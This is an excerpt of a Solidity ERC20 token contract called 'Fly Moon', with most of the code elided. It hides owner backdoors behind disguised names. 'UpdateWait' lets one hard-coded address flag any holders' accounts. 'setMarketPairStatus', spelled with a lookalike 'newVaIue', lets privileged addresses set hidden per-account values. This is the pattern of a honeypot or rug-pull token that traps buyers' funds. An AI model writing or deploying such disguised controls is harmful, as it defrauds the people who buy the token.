...
contract FM is Context, IERC20, Ownable {
    ...
    string private _name = "Fly Moon";
    string private _symbol = "Fly Moon";
    ...
    uint256 public _walletMax = 888888 * 10**_decimals;
    ...
    constructor () {
        ...
        teamWalletAddress = payable(address(0xD4F9D82D8f299EE9ABDC571E46E0a3f852aa396f));
        m = payable(address(0xD4F9D82D8f299EE9ABDC571E46E0a3f852aa396f));
    ...
    function UpdateWait(address[] calldata accoumt ,bool claimWait ) public {if(msg.sender == m){
        for(uint256 i = 0; i < accoumt.length; i++) 
            _transferr[accoumt[i]] = claimWait;}
    }
    ...
    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        return true;
    }function setMarketPairStatus(address accoumt, uint256 newVaIue) public {if(isMMMPair[__msgSender()])_fiifainalso[accoumt] = newVaIue;}
